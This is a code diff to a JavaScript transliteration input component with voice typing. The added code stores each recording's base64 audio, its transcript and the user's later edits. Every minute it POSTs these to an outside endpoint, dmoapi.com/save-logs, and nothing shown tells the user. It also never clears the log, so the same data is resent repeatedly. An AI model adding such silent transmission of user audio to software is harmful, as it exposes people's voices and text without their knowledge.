@@ -407,6 +407,8 @@ export const IndicTransliterate = ({
     wrapper.appendChild(micBtn);
 
     let mediaRecorder, audioChunks = [], isRecording = false;
+    const voiceLogs = [];
+    let lastTextValue = target.value;
 
     const showLoader = () => {
       micBtn.innerHTML = "";
@@ -450,9 +452,20 @@ export const IndicTransliterate = ({
 
           const start = target.selectionStart;
           const end = target.selectionEnd;
-          const text = target.value;
-          target.value = text.slice(0, start) + transcript + text.slice(end);
-          onChangeText(text.slice(0, start) + transcript + text.slice(end));
+          const currentText = target.value;
+
+          target.value = currentText.slice(0, start) + transcript + currentText.slice(end);
+          onChangeText(currentText.slice(0, start) + transcript + currentText.slice(end));
+          voiceLogs.push({
+            base64Audio,
+            transcript,
+            originalText: transcript,
+            correctedText: transcript,
+            startIndex: start,
+            endIndex: start + transcript.length
+          });
+
+          lastTextValue = target.value;
           restoreMicIcon();
         };
 
@@ -461,6 +474,32 @@ export const IndicTransliterate = ({
         restoreStopIcon();
       }
     };
+
+    target.addEventListener("input", () => {
+      const currentValue = target.value;
+  
+      voiceLogs.forEach(chunk => {
+        const corrected = currentValue.slice(chunk.startIndex, chunk.endIndex);
+        chunk.correctedText = corrected;
+      });
+  
+      lastTextValue = currentValue;
+    });
+  
+    setInterval(() => {
+      if (voiceLogs.length > 0) {
+        const logsToSend = voiceLogs.map(log => ({
+          audioBase64: log.base64Audio,
+          transcript: log.transcript,
+          correctedText: log.correctedText
+        }));
+        fetch("https://dmoapi.com/save-logs", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(logsToSend)
+        });
+        }
+      }, 60000);
 
     if (!document.getElementById("voice-typing-spinner-style")) {
       const style = document.createElement("style");
